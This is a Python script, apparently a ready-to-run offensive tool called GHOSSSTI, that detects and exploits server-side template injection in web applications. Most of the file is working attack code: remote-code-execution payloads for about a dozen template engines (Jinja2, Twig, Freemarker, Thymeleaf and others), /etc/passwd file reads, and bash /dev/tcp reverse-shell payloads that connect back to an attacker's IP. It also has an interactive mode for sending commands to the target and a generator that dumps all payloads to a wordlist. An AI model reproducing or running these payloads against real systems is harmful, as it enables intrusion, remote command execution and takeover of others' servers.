#!/usr/bin/env python3
"""
GHOSSSTI - Advanced SSTI Framework
Advanced Server-Side Template Injection Detection and Exploitation Tool
For Ghost Ops Security - Professional Penetration Testing

Author: Ghost Ops Security
Purpose: Legitimate security testing and authorized penetration testing only
"""

import requests
import argparse
import sys
import time
import urllib.parse
from typing import Dict, List, Tuple, Optional
from colorama import Fore, Style, init
import re
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

class SSTIScanner:
    def __init__(self, url: str, parameter: str = None, method: str = "GET", 
                 data: Dict = None, headers: Dict = None, cookies: Dict = None,
                 proxy: str = None, timeout: int = 10, threads: int = 5):
        self.url = url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.detected_engine = None
        self.vulnerable_param = None
        
        # Polyglot payloads for initial detection
        self.polyglot_payloads = [
            "${7*7}",
            "{{7*7}}",
            "{{7*'7'}}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
        ]
        
        # Template-specific detection payloads
        self.detection_payloads = {
            "Jinja2": {
                "payloads": [
                    "{{7*7}}",
                    "{{7*'7'}}",
                    "{{config}}",
                    "{{self}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                ],
                "expected": ["49", "7777777", "Config"]
            },
            "Twig": {
                "payloads": [
                    "{{7*7}}",
                    "{{7*'7'}}",
                    "{{_self}}",
                    "{{dump(app)}}",
                ],
                "expected": ["49", "7777777"]
            },
            "Freemarker": {
                "payloads": [
                    "${7*7}",
                    "${7*'7'}",
                    "#{7*7}",
                    "${7777777-7777758}",
                ],
                "expected": ["49"]
            },
            "Velocity": {
                "payloads": [
                    "#set($x=7*7)$x",
                    "#set($x=7)$x$x",
                ],
                "expected": ["49", "77"]
            },
            "Smarty": {
                "payloads": [
                    "{7*7}",
                    "{php}echo 7*7;{/php}",
                    "{$smarty.version}",
                ],
                "expected": ["49"]
            },
            "Mako": {
                "payloads": [
                    "${7*7}",
                    "<%=7*7%>",
                ],
                "expected": ["49"]
            },
            "Pug": {
                "payloads": [
                    "#{7*7}",
                    "#{function(){return 7*7}()}",
                ],
                "expected": ["49"]
            },
            "ERB": {
                "payloads": [
                    "<%= 7*7 %>",
                    "<%= 7*'7' %>",
                ],
                "expected": ["49", "7777777"]
            },
            "Tornado": {
                "payloads": [
                    "{{7*7}}",
                    "{% import os %}{{os.system('echo 49')}}",
                ],
                "expected": ["49"]
            },
            "Django": {
                "payloads": [
                    "{{7|add:7}}",
                    "{{7|add:'7'}}",
                ],
                "expected": ["14", "77"]
            },
            "Handlebars": {
                "payloads": [
                    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 49\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                ],
                "expected": ["49"]
            },
            "Thymeleaf": {
                "payloads": [
                    "${7*7}",
                    "*{7*7}",
                    "#{7*7}",
                    "@{7*7}",
                    "~{7*7}",
                ],
                "expected": ["49"]
            },
            "Jade": {
                "payloads": [
                    "#{7*7}",
                ],
                "expected": ["49"]
            },
            "Nunjucks": {
                "payloads": [
                    "{{7*7}}",
                    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo 49')\")()}}",
                ],
                "expected": ["49"]
            },
        }
        
        # Exploitation payloads by engine
        self.exploitation_payloads = {
            "Jinja2": {
                "rce": [
                    # Python 2 & 3 compatible
                    "{{''.__class__.__mro__[1].__subclasses__()[{INDEX}].__init__.__globals__['sys'].modules['os'].popen('{CMD}').read()}}",
                    "{{config.__class__.__init__.__globals__['os'].popen('{CMD}').read()}}",
                    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
                    "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('{CMD}').read()}}",
                    "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('{CMD}').read()}}",
                    # Using lipsum
                    "{{lipsum.__globals__['os'].popen('{CMD}').read()}}",
                    "{{lipsum.__globals__.os.popen('{CMD}').read()}}",
                    # Using cycler
                    "{{cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
                    # File read
                    "{{''.__class__.__mro__[1].__subclasses__()[{INDEX}]('/etc/passwd').read()}}",
                ],
                "shell": [
                    "{{''.__class__.__mro__[1].__subclasses__()[{INDEX}].__init__.__globals__['sys'].modules['os'].popen('bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"').read()}}",
                    "{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"').read()}}",
                ]
            },
            "Twig": {
                "rce": [
                    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"{CMD}\")}}",
                    "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"{CMD}\")}}",
                    "{{['id']|filter('system')}}",
                    "{{['cat /etc/passwd']|filter('system')}}",
                    "{{_self.env.enableDebug()}}{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{CMD}')}}",
                ],
                "shell": [
                    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'\")}}",
                ]
            },
            "Freemarker": {
                "rce": [
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"{CMD}\")}",
                    "<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"java.lang.ProcessBuilder\",\"bash\",\"-c\",\"{CMD}\").start()}",
                ],
                "shell": [
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'\")}",
                ]
            },
            "Velocity": {
                "rce": [
                    "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('{CMD}'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
                ],
                "shell": [
                    "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('bash -c {bash -i >& /dev/tcp/{IP}/{PORT} 0>&1}'))##",
                ]
            },
            "Smarty": {
                "rce": [
                    "{php}system('{CMD}');{/php}",
                    "{php}echo `{CMD}`;{/php}",
                    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('{CMD}'); ?>\",self::clearConfig())}",
                ],
                "shell": [
                    "{php}system('bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"');{/php}",
                ]
            },
            "Mako": {
                "rce": [
                    "<%import os%>${os.popen('{CMD}').read()}",
                    "<%import os%>${os.system('{CMD}')}",
                ],
                "shell": [
                    "<%import os%>${os.popen('bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"').read()}",
                ]
            },
            "ERB": {
                "rce": [
                    "<%= `{CMD}` %>",
                    "<%= system('{CMD}') %>",
                    "<%= IO.popen('{CMD}').readlines() %>",
                ],
                "shell": [
                    "<%= `bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'` %>",
                ]
            },
            "Tornado": {
                "rce": [
                    "{% import os %}{{os.system('{CMD}')}}",
                    "{% import subprocess %}{{subprocess.check_output('{CMD}',shell=True)}}",
                ],
                "shell": [
                    "{% import os %}{{os.system('bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"')}}",
                ]
            },
            "Handlebars": {
                "rce": [
                    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('{CMD}');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                ],
                "shell": [
                    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\\'');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                ]
            },
            "Nunjucks": {
                "rce": [
                    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('{CMD}')\")()}}",
                ],
                "shell": [
                    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\\'')\")()}}",
                ]
            },
            "Thymeleaf": {
                "rce": [
                    "${T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
                    "*{T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
                    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())}",
                ],
                "shell": [
                    "${T(java.lang.Runtime).getRuntime().exec('bash -c {bash -i >& /dev/tcp/{IP}/{PORT} 0>&1}')}",
                ]
            },
        }

    def print_banner(self):
        banner = f"""
{Fore.CYAN}               ╔══════════════════════════════════════════════╗
{Fore.CYAN}               ║             {Fore.WHITE}👻 GHOSSSTI 👻{Fore.CYAN}                  ║
{Fore.CYAN}               ║  {Fore.YELLOW}Ghost Ops Server-Side Template Injection{Fore.CYAN}  ║
{Fore.CYAN}               ╚══════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.RED}    ██████{Fore.WHITE}╗ {Fore.RED}██{Fore.WHITE}╗  {Fore.RED}██{Fore.WHITE}╗ {Fore.RED}██████{Fore.WHITE}╗ {Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗{Fore.YELLOW}████████{Fore.WHITE}╗{Fore.YELLOW}██{Fore.WHITE}╗
{Fore.RED}   ██{Fore.WHITE}╔════╝ {Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔═══{Fore.RED}██{Fore.WHITE}╗{Fore.RED}██{Fore.WHITE}╔════╝{Fore.RED}██{Fore.WHITE}╔════╝{Fore.YELLOW}██{Fore.WHITE}╔════╝╚══{Fore.YELLOW}██{Fore.WHITE}╔══╝{Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║  {Fore.RED}███{Fore.RED}███████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║   {Fore.RED}██{Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ╚██████{Fore.WHITE}╔╝{Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║╚{Fore.RED}██████{Fore.WHITE}╔╝{Fore.RED}███████{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}║{Fore.YELLOW}███████{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝{Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝{Style.RESET_ALL}

{Fore.GREEN}       ╔════════════════════════════════════════════════════════════╗
{Fore.GREEN}       ║  {Fore.WHITE}Ghost Ops Server-Side Template Injection Framework{Fore.GREEN}    ║
{Fore.GREEN}       ║  {Fore.CYAN}Detection → Identification → Exploitation{Fore.GREEN}               ║
{Fore.GREEN}       ╠════════════════════════════════════════════════════════════╣
{Fore.GREEN}       ║  {Fore.YELLOW}✓ 14+ Engines{Fore.WHITE}  |  {Fore.RED}✓ RCE{Fore.WHITE}  |  {Fore.RED}✓ Reverse Shells{Fore.GREEN}           ║
{Fore.GREEN}       ║  {Fore.MAGENTA}Ghost Ops Security - Professional Penetration Testing{Fore.GREEN}  ║
{Fore.GREEN}       ╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)

    def make_request(self, payload: str, param: str = None) -> Optional[str]:
        """Make HTTP request with payload"""
        try:
            if param is None:
                param = self.parameter
            
            if self.method == "GET":
                params = {param: payload}
                response = self.session.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:  # POST
                data = self.data.copy()
                data[param] = payload
                response = self.session.post(
                    self.url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            return response.text
        except Exception as e:
            print(f"{Fore.RED}[!] Error making request: {str(e)}{Style.RESET_ALL}")
            return None

    def detect_ssti(self) -> Tuple[bool, Optional[str], Optional[str]]:
        """Detect if SSTI vulnerability exists and identify template engine"""
        print(f"\n{Fore.YELLOW}[*] Starting SSTI detection...{Style.RESET_ALL}")
        
        # If no parameter specified, try to find vulnerable parameters
        if not self.parameter:
            print(f"{Fore.YELLOW}[*] No parameter specified, attempting to find vulnerable parameters...{Style.RESET_ALL}")
            params = self.find_parameters()
            if not params:
                print(f"{Fore.RED}[!] No parameters found to test{Style.RESET_ALL}")
                return False, None, None
        else:
            params = [self.parameter]
        
        # Test each parameter
        for param in params:
            print(f"{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            # Get baseline response
            baseline = self.make_request("GHOSTOPS_BASELINE", param)
            if not baseline:
                continue
            
            # Test polyglot payloads first
            print(f"{Fore.YELLOW}[*] Testing polyglot payloads...{Style.RESET_ALL}")
            for payload in self.polyglot_payloads:
                response = self.make_request(payload, param)
                if response and response != baseline:
                    if "49" in response or "7777777" in response:
                        print(f"{Fore.GREEN}[+] Potential SSTI detected with payload: {payload}{Style.RESET_ALL}")
                        # Now identify the specific engine
                        engine = self.identify_engine(param, baseline)
                        if engine:
                            self.vulnerable_param = param
                            self.detected_engine = engine
                            return True, engine, param
            
            # If polyglot didn't work, try engine-specific detection
            print(f"{Fore.YELLOW}[*] Testing engine-specific payloads...{Style.RESET_ALL}")
            for engine, details in self.detection_payloads.items():
                for payload in details["payloads"]:
                    response = self.make_request(payload, param)
                    if response and response != baseline:
                        for expected in details["expected"]:
                            if expected in response:
                                print(f"{Fore.GREEN}[+] SSTI vulnerability detected!{Style.RESET_ALL}")
                                print(f"{Fore.GREEN}[+] Template Engine: {engine}{Style.RESET_ALL}")
                                print(f"{Fore.GREEN}[+] Vulnerable Parameter: {param}{Style.RESET_ALL}")
                                print(f"{Fore.GREEN}[+] Payload: {payload}{Style.RESET_ALL}")
                                self.vulnerable_param = param
                                self.detected_engine = engine
                                return True, engine, param
        
        print(f"{Fore.RED}[!] No SSTI vulnerability detected{Style.RESET_ALL}")
        return False, None, None

    def find_parameters(self) -> List[str]:
        """Attempt to find parameters in the URL or form"""
        params = []
        
        # Check URL parameters
        parsed = urllib.parse.urlparse(self.url)
        if parsed.query:
            query_params = urllib.parse.parse_qs(parsed.query)
            params.extend(query_params.keys())
        
        # Check POST data
        if self.data:
            params.extend(self.data.keys())
        
        # If still no params, try common parameter names
        if not params:
            common_params = ['name', 'user', 'search', 'q', 'query', 'page', 'id', 'template', 
                           'view', 'content', 'data', 'input', 'text', 'message']
            print(f"{Fore.YELLOW}[*] Trying common parameter names...{Style.RESET_ALL}")
            params = common_params
        
        return params

    def identify_engine(self, param: str, baseline: str) -> Optional[str]:
        """Identify the specific template engine"""
        print(f"{Fore.YELLOW}[*] Identifying template engine...{Style.RESET_ALL}")
        
        for engine, details in self.detection_payloads.items():
            matches = 0
            for payload in details["payloads"][:3]:  # Test first 3 payloads
                response = self.make_request(payload, param)
                if response and response != baseline:
                    for expected in details["expected"]:
                        if expected in response:
                            matches += 1
                            break
            
            if matches >= 2:  # If at least 2 payloads match
                print(f"{Fore.GREEN}[+] Identified engine: {engine}{Style.RESET_ALL}")
                return engine
        
        return None

    def exploit_rce(self, command: str) -> bool:
        """Exploit SSTI for RCE"""
        if not self.detected_engine or not self.vulnerable_param:
            print(f"{Fore.RED}[!] No SSTI vulnerability detected. Run detection first.{Style.RESET_ALL}")
            return False
        
        print(f"\n{Fore.YELLOW}[*] Attempting RCE exploitation...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Command: {command}{Style.RESET_ALL}")
        
        if self.detected_engine not in self.exploitation_payloads:
            print(f"{Fore.RED}[!] No exploitation payloads available for {self.detected_engine}{Style.RESET_ALL}")
            return False
        
        payloads = self.exploitation_payloads[self.detected_engine].get("rce", [])
        
        for payload_template in payloads:
            # Handle special index substitution for Jinja2
            if "{INDEX}" in payload_template:
                for index in [40, 41, 59, 400, 401]:  # Common subprocess.Popen indices
                    payload = payload_template.replace("{INDEX}", str(index)).replace("{CMD}", command)
                    print(f"{Fore.YELLOW}[*] Trying payload (index {index})...{Style.RESET_ALL}")
                    response = self.make_request(payload, self.vulnerable_param)
                    if response:
                        print(f"{Fore.GREEN}[+] Command executed!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Response:{Style.RESET_ALL}\n{response[:500]}")
                        return True
            else:
                payload = payload_template.replace("{CMD}", command)
                print(f"{Fore.YELLOW}[*] Trying payload: {payload[:100]}...{Style.RESET_ALL}")
                response = self.make_request(payload, self.vulnerable_param)
                if response:
                    print(f"{Fore.GREEN}[+] Command executed!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Response:{Style.RESET_ALL}\n{response[:1000]}")
                    return True
        
        print(f"{Fore.RED}[!] RCE exploitation failed{Style.RESET_ALL}")
        return False

    def exploit_shell(self, ip: str, port: int) -> bool:
        """Exploit SSTI for reverse shell"""
        if not self.detected_engine or not self.vulnerable_param:
            print(f"{Fore.RED}[!] No SSTI vulnerability detected. Run detection first.{Style.RESET_ALL}")
            return False
        
        print(f"\n{Fore.YELLOW}[*] Attempting reverse shell exploitation...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {ip}:{port}{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Make sure you have a listener running: nc -lvnp {port}{Style.RESET_ALL}")
        
        if self.detected_engine not in self.exploitation_payloads:
            print(f"{Fore.RED}[!] No exploitation payloads available for {self.detected_engine}{Style.RESET_ALL}")
            return False
        
        payloads = self.exploitation_payloads[self.detected_engine].get("shell", [])
        
        for payload_template in payloads:
            # Handle special index substitution for Jinja2
            if "{INDEX}" in payload_template:
                for index in [40, 41, 59, 400, 401]:
                    payload = payload_template.replace("{INDEX}", str(index)).replace("{IP}", ip).replace("{PORT}", str(port))
                    print(f"{Fore.YELLOW}[*] Sending reverse shell payload (index {index})...{Style.RESET_ALL}")
                    response = self.make_request(payload, self.vulnerable_param)
                    time.sleep(2)
                    print(f"{Fore.GREEN}[+] Payload sent! Check your listener.{Style.RESET_ALL}")
                    return True
            else:
                payload = payload_template.replace("{IP}", ip).replace("{PORT}", str(port))
                print(f"{Fore.YELLOW}[*] Sending reverse shell payload...{Style.RESET_ALL}")
                response = self.make_request(payload, self.vulnerable_param)
                time.sleep(2)
                print(f"{Fore.GREEN}[+] Payload sent! Check your listener.{Style.RESET_ALL}")
                return True
        
        print(f"{Fore.RED}[!] Reverse shell exploitation failed{Style.RESET_ALL}")
        return False

    def generate_payloads(self, output_file: str):
        """Generate payload list for manual testing"""
        print(f"\n{Fore.YELLOW}[*] Generating payload list...{Style.RESET_ALL}")
        
        payloads = []
        
        # Add detection payloads
        payloads.append("# Detection Payloads\n")
        for engine, details in self.detection_payloads.items():
            payloads.append(f"\n## {engine}\n")
            for payload in details["payloads"]:
                payloads.append(f"{payload}\n")
        
        # Add exploitation payloads
        payloads.append("\n# Exploitation Payloads\n")
        for engine, exploit_types in self.exploitation_payloads.items():
            payloads.append(f"\n## {engine}\n")
            for exploit_type, payload_list in exploit_types.items():
                payloads.append(f"\n### {exploit_type.upper()}\n")
                for payload in payload_list:
                    payloads.append(f"{payload}\n")
        
        with open(output_file, 'w') as f:
            f.writelines(payloads)
        
        print(f"{Fore.GREEN}[+] Payloads saved to: {output_file}{Style.RESET_ALL}")

    def interactive_mode(self):
        """Interactive exploitation mode"""
        if not self.detected_engine or not self.vulnerable_param:
            print(f"{Fore.RED}[!] No vulnerability detected. Please run detection first.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
        print(f"║         Interactive Exploitation          ║")
        print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"\n{Fore.GREEN}[+] Vulnerable Parameter: {self.vulnerable_param}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Template Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Commands:{Style.RESET_ALL}")
        print(f"  cmd <command>     - Execute system command")
        print(f"  shell <ip> <port> - Get reverse shell")
        print(f"  quit              - Exit interactive mode")
        
        while True:
            try:
                user_input = input(f"\n{Fore.CYAN}SSTI>{Style.RESET_ALL} ").strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() in ['quit', 'exit', 'q']:
                    break
                
                parts = user_input.split()
                command = parts[0].lower()
                
                if command == 'cmd' and len(parts) > 1:
                    cmd = ' '.join(parts[1:])
                    self.exploit_rce(cmd)
                elif command == 'shell' and len(parts) == 3:
                    ip = parts[1]
                    port = int(parts[2])
                    self.exploit_shell(ip, port)
                else:
                    print(f"{Fore.RED}[!] Invalid command{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Exiting interactive mode...{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="GHOSSSTI - Ghost Ops Server-Side Template Injection Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic detection
  python3 ghosssti.py -u "http://target.com/page" -p name
  
  # Detection with POST method
  python3 ghosssti.py -u "http://target.com/api" -p template -m POST -d "key=value"
  
  # Detect and exploit (RCE)
  python3 ghosssti.py -u "http://target.com/page" -p name --exploit-cmd "id"
  
  # Detect and get reverse shell
  python3 ghosssti.py -u "http://target.com/page" -p name --exploit-shell 10.10.14.5 4444
  
  # Interactive mode
  python3 ghosssti.py -u "http://target.com/page" -p name --interactive
  
  # Generate payload wordlist
  python3 ghosssti.py --generate-payloads ssti_payloads.txt
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-p', '--parameter', help='Parameter to test (will auto-detect if not specified)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data (format: key1=value1&key2=value2)')
    parser.add_argument('-H', '--headers', help='Custom headers (format: "Header1: Value1\\nHeader2: Value2")')
    parser.add_argument('-c', '--cookies', help='Cookies (format: "name1=value1; name2=value2")')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for detection')
    
    # Exploitation options
    parser.add_argument('--exploit-cmd', metavar='COMMAND', help='Command to execute after detection')
    parser.add_argument('--exploit-shell', nargs=2, metavar=('IP', 'PORT'), help='Reverse shell IP and port')
    parser.add_argument('--interactive', action='store_true', help='Interactive exploitation mode')
    
    # Utility options
    parser.add_argument('--generate-payloads', metavar='FILE', help='Generate payload wordlist to file')
    parser.add_argument('--detect-only', action='store_true', help='Only detect, do not exploit')
    
    args = parser.parse_args()
    
    # Handle payload generation
    if args.generate_payloads:
        scanner = SSTIScanner("http://dummy.com")
        scanner.print_banner()
        scanner.generate_payloads(args.generate_payloads)
        return
    
    # Validate required arguments
    if not args.url:
        parser.print_help()
        sys.exit(1)
    
    # Parse data
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                data[key] = value
    
    # Parse headers
    headers = {}
    if args.headers:
        for line in args.headers.split('\\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Initialize scanner
    scanner = SSTIScanner(
        url=args.url,
        parameter=args.parameter,
        method=args.method,
        data=data,
        headers=headers,
        cookies=cookies,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads
    )
    
    scanner.print_banner()
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Run detection
    vulnerable, engine, param = scanner.detect_ssti()
    
    if not vulnerable:
        sys.exit(1)
    
    # Handle exploitation options
    if args.detect_only:
        print(f"\n{Fore.GREEN}[+] Detection complete. Exiting (--detect-only flag set){Style.RESET_ALL}")
        sys.exit(0)
    
    if args.exploit_cmd:
        scanner.exploit_rce(args.exploit_cmd)
    elif args.exploit_shell:
        ip, port = args.exploit_shell
        scanner.exploit_shell(ip, int(port))
    elif args.interactive:
        scanner.interactive_mode()
    else:
        print(f"\n{Fore.YELLOW}[*] Use --exploit-cmd, --exploit-shell, or --interactive for exploitation{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
